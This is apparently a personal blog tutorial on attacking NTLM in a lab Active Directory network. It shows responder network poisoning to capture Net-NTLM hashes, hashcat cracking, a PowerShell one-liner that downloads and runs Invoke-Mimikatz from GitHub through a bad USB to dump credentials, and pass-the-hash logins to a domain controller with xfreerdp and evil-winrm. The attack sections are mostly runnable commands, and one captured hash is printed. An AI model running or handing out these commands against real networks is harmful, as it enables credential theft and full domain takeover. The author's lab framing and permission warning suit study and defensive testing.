# INTRO
NTLM, otherwise known as the NT (New Technology) LAN Manager is a system of Microsoft security protocols used to provide various services within a Windows network. It is used to facilitate the following aspects:
- Authentication;
- Integrity and;
- Confidentiality.

NTLM is preceded by the Microsoft LAN Manager (LANMAN) and is succeeded by the new cross-platform protocol, Kerberos. Despite being considered insecure by today's standards, NTLM is still widely used within corporate and some home-lab Windows networks - usually as a fallback if other protocols like Kerberos aren't available for a particular service.

Unfortunately, this means that if an attacker gains access to the local area network which hosts a Windows network, downgrade attacks can happen if NTLM is still enabled.

# OVERVIEW
We'll explore 2 ways, in which an attacker with either physical or remote access to the local network and/or devices can exfiltrate NTLM and Net-NTLM hashes in order to compromise a network.

# METHOD 1
## Network Attack Theory
This attack requires that the attacker gains access to the local area network, either by connecting their malicious device using a wireless connection such as Wi-Fi or through establishing a wired connection using Ethernet.

> It's also possible an ttacker could also perform this attack remotely if they have remote root access to a device which is already on the local network.

A utility called `responder` can be used to poison the local network by sending out false information onto the local network via broadcast which tricks devices into trusting the attacker's machine or otherwise accepting malicious network configuration information, allowing the attacker to capture and redirect certain types of traffic within the network.

In this attack, `responder` poisons the following network services which are common on Windows and other networks:
- LLMNR (Link-Local Multicast Name Resolution) https://en.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution
- NBT-NS (NetBIOS Name Service)
https://en.wikipedia.org/wiki/NetBIOS
- DNS (Domain Name System)
https://en.wikipedia.org/wiki/Domain_Name_System
- mDNS (Multicast DNS)
https://en.wikipedia.org/wiki/Multicast_DNS
- DHCP (Dynamic Host Configuration Protocol)
https://en.wikipedia.org/wiki/Dynamic_Host_Configuration_Protocol

I'm not going to go into full detail on all of these protocols however just be aware that these are commonly used in local networks to provide automatic discovery of services and devices on the network. Now, anything that is automatic evidently must have some weaknesses and that is indeed what spoofing/poisoning is an example of.

Once `responder` has poisoned the network, it will spawn a number of fake servers which will answer to a client's request for a service, and in turn capture their Net-NTLM hash which can then be cracked. `responder` is configured by default to spawn all of the following servers: `HTTP`, `HTTPS`, `WPAD Proxy`, `Auth proxy`, `SMB`, `Kerberos`, `SQL`, `FTP`, `IMAP`, `POP3`, `SMTP`, `DNS`, `LDAP`, `RDP`, `DCE-RPC`, `WinRM`.

On a Windows network, the most common type of server you would find is SMB, which stands for Server Message Block, that is used to provide shared access to files on a dedicated fileserver as well as shared access to organisation resources such as printers, scanners, media and other IoT devices.

In our example, when `responder` poisons the network, nothing will happen until a user on the network tries to access a file server which doesn't exist. In this way, the network continues to work as intended and nothing seems unusual.

> It must be noted that in the past, prior to CVE-2018-8320 being patched, the attacker could use WPAD spoofing to perform a zero-click attack and steal the Net-NTLM hash without user interaction.

So, in a nutshell - here's what happens:
- Attacker poisons the local network.
- Attacker spawns fake servers that will reply to a client's requests.
- Client requests access to a fileserver called `\\fileserver1`.
- Attacker will reply with its own IP address before the server or gateway does.
- Client requests access to what it thinks is `\\fileserver1` from the attacker's IP address.
- Attacker requests the client to authenticate, giving it a "challenge" (as required by Net-NTLM protocol).
- Client responds with the answer containing their Net-NTLM hash in order to authenticate (Game over at this point)
- Attacker can either ignore the client or send back an error.

## Network Attack Demo

> :warning: You should only perform this attack on a network you own or have permission to attack from the owner. In my example, I created the Windows AD DS network on my own computer in a virtual environment and gave myself permission to attack it.

The network which we are going to attack us an Active Directory network (https://en.wikipedia.org/wiki/Active_Directory) which is commonly used in organisations to manage a lot of computers at the same time.

I won't cover how to set up Active Directory however below I have provided 2 screenshots of both the domain controller and the client PC we will be targeting.

![Server 2022 (logged on as `ECORP\Administrator`).](https://github.com/adev4004/rants/blob/main/assets/0/0.png?raw=true)
Server 2022 (logged on as `ECORP\Administrator`).

![Windows 10 PC (logged on as `ECORP\Volk`, a standard user).](https://github.com/adev4004/rants/blob/main/assets/0/1.png?raw=true)
Windows 10 PC (logged on as `ECORP\Volk`, a standard user).

In our made-up scenario, we will assume that the attacker has gained physical access to the local area network by breaching physical security. They have gained access to the local network by connecting an ethernet cable to a socket in the wall. The organisation did not employ 802.1x security so the attacker is able to communicate on the local network right away.

![The attacker's laptop, displaying the `neofetch` system info command.](https://github.com/adev4004/rants/blob/main/assets/0/2.png?raw=true)
The attacker's laptop, displaying the `neofetch` system info command.

`responder`, the tool used for performing this attack is already preinstalled on Kali Linux. The attacker runs the comamnd to start poisoning the network:
```bash
sudo responder -I eth0 -wPdv
```

- The switch `-I` tells `responder` to use the `eth0` Ethernet interface on the laptop computer - the one which is connected to the office's network. 
- The `-wPdv` is a composite switch which enables several features of `responder`:
	- `w` enables the "WPAD rogue proxy server", this is effective if a client PC within the office isn't protected against CVE-2018-8320.
	- `P` specifies that NTLM basic authentication should be used for the WPAD rogue proxy server.
	- `d` enables the DHCP poisoning feature which poisons DHCP replies including WPAD parameters.
	- `v` enables verbose mode for additional output to the terminal which may be useful.

![The attacker successfully ran `sudo responder -I eth0 -wPdv`.](https://github.com/adev4004/rants/blob/main/assets/0/4.png?raw=true)
The attacker successfully ran `sudo responder -I eth0 -wPdv`.

At this stage, all the attacker has to do is wait. No more action is required to obtain the Net-NTLM hash. Unaware of this attack, the office worker logged into `ECORP\Volk` has tried to access `\\fileserver1` after receiving an email from what appears to be a colleague from another department. The email said that this file server was new and that IT have not yet implemented a new GPO in order to automount it to an easily accessible drive letter within file explorer.

This is an example of a hybrid cyber attack, making use of both the technical weaknesses of the network as well as social engineering. The colleague sees no reason to find the email suspicious as there were no links or instructions to access external resources - just instructions on how to open the file share on the organisation's Intranet which is considered to be secure.

![The user sees a login prompt to access the file server which doesn't actually exist.](https://github.com/adev4004/rants/blob/main/assets/0/5.png?raw=true)
The user sees a login prompt to access the file server which doesn't actually exist.

### What Happened?
The user has typed in `\\fileserver1` into file explorer. This caused their computer to send out broadcast discovery packets onto the local network to find `\\fileserver1`. Now, this server doesn't actually exist; however, because the attacker was connected to the local network and was running `responder`, their computer detected this broadcast and replied to it, asking for authentication information, pretending to be `\\fileserver1`.

![The attacker's laptop now has the Net-NTLM hash of this user shown below:](https://github.com/adev4004/rants/blob/main/assets/0/6.png?raw=true)
The attacker's laptop now has the Net-NTLM hash of this user shown below:
```
Volk::ECORP:ba76b84d43182ff2:7CAC69B572C1DBDE23C6121B288455D3:010100000000000000461D5559C2D9015BD2D221D376806C0000000002000800390032005800340001001E00570049004E002D005100480044005200570042003800350030005000500004003400570049004E002D00510048004400520057004200380035003000500050002E0039003200580034002E004C004F00430041004C000300140039003200580034002E004C004F00430041004C000500140039003200580034002E004C004F00430041004C000700080000461D5559C2D90106000400020000000800300030000000000000000000000000200000D3CC195F5BAC4178690577FCC871FBE4932B0F8B68110BD9560A419A5EBBBEB20A001000000000000000000000000000000000000900200063006900660073002F00660069006C00650073006500720076006500720031000000000000000000
```

Suspecting something is odd, the user does not login to this suspicious file server - however it's already too late. Simply by accessing it, the Net-NTLM hash has already been captured for his account as Windows automatically tried to login using his account for him.

Now unlike the regular NTLM hashes, which we will demonstrate further on, these hashes are useless unless cracked. One could use a utility such as `hashcat` to try and quickly do so using a wordlist such as `rockyou.txt` which has a list of all the worst passwords imaginable.
```bash
hashcat -a 0 -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
```
Where `hash.txt` contains the Net-NTLM hash string and `cracked.txt` will contain the plaintext password, if found. There are other ways to crack passwords, using different utilities, but that's beyond our scope.

> Note by default the rockyou.txt list in gzipped inside an archive and you will need to unzip it with `gzip -d /usr/share/wordlists/rockyou.txt.gz`.

# METHOD 2
## Local NTLM Hash Theory
If one can gain physical access to a machine logged on to a privileged account, they can dump the credentials of all users logged onto that machine within seconds. You can achieve this by dumping the NTLM hashes using Mimikatz - a popular utility for exploiting Windows. You can use a bad USB or rubber ducky in order to do this quickly. Please be aware that Mimikatz is a known tool and is detected by most anti-virus companies, for our demo we had to disable Windows Defender.

Here's an example script that could be typed into a run-box and then executed as administrator with the key-combination of `CTRL` + `SHIFT` + `ENTER`:
```
powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds | Out-File "E:\hashes-dump.txt"
```


## "Pass The Hash" Theory
This method works because of an inherent weakness of LANMAN and NTLM's handling of user sessions. When a user logs into the local PC, NTLM handles this authentication and stores the user's password as a hash in system memory, where it was originally deemed to be secure. Unfortunately, this isn't the case and a tool like Mimikatz can rip it right out of memory, allowing the hash to be used in order to impersonate that user account in almost any security context.

This hash is also the same accross multiple login sessions, until the password is changed so it allows attackers to have persistent access to the compromised user account. The hash is mainly used in place of the password when the system needs to authenticate to other Windows services, etc. However, for obvious reasons, this hash is never transmitted over the network (Windows uses Net-NTLM for that) and is only used locally.

## Local NTLM Hash Demo
So in this example, an IT admin has logged onto a local user account on a PC which isn't working correctly. Unfortunately, they have forgotten to log out or lock the PC before walking away from it for whatever reason.

The attacker takes advantage of this opportunity and inserts their bad USB into the PC. The script executes.

![Dumped text file containing the Mimikatz output which has the hashes for each logged in user.](https://github.com/adev4004/rants/blob/main/assets/0/7.png?raw=true)
Dumped text file containing the Mimikatz output which has the hashes for each logged in user.

The attacker can now walk away and examine the hashes on their own laptop and begin to craft their next attack.

## "Pass The Hash" Demo
They have identified that the Domain Admin `dcadmin` was also logged onto this PC at some point. This is useful because they can now access any domain PC, and possibly the domain controller itself. They have obtained their hash which is `122d9d86ba71db735933590c35c59620` and will attempt to login as them to the same PC.

They then run this command to connect via RDP:
```bash
xfreerdp /u:dcadmin /d:ECORP /pth:122d9d86ba71db735933590c35c59620 /v:DESKTOP-QI7IGA2.ecorp.net
```

![RDP connection failed due to a new group policy in newer versions of Windows.](https://github.com/adev4004/rants/blob/main/assets/0/8.png?raw=true)
RDP connection failed due to a new group policy in newer versions of Windows.

Unfortunately, this method no longer works for RDP on newer versions of Windows that have a certain policy `Restrict delegation of credentials to the remote servers` enabled which affects Remote Desktop Services.

However, the attacker thinks that the Domain Controller server may have Windows Remote Management enabled so they will try and gain a shell to the server using `evil-winrm`. They used this command:
```bash
evil-winrm -i 172.0.16.1 -u dcadmin -H 122d9d86ba71db735933590c35c59620
```

They know the IP address of the DC because it happens to also be the gateway of this poorly configured network.

![They attacker has a shell using the WinRM service using "pass the hash" technique.](https://github.com/adev4004/rants/blob/main/assets/0/9.png?raw=true)
They attacker has a shell using the WinRM service using "pass the hash" technique.

At this stage they can infect the DC with malware because as far as security is concerned, this is game over for the network. The attacker can even change the group policy settings to allow the RDP sessions to use pass the hash.

# OUTRO
Well done for getting this far. You've now learnt a bit about legacy Windows security protocols and how they can be exploited to gain access to an AD DS network. If you're interested in this kind of stuff, I'd encourage reading about Kerberos golden tickets as that's another powerful method of gaining full access to a domain's resources.

# Further reading
- https://www.thehacker.recipes/ad/movement/ntlm
- https://book.hacktricks.xyz/windows-hardening/ntlm
- https://medium.com/cyber-security-resources/hacking-and-cracking-ntlm-hash-to-get-windows-admin-password-f44819b01db5
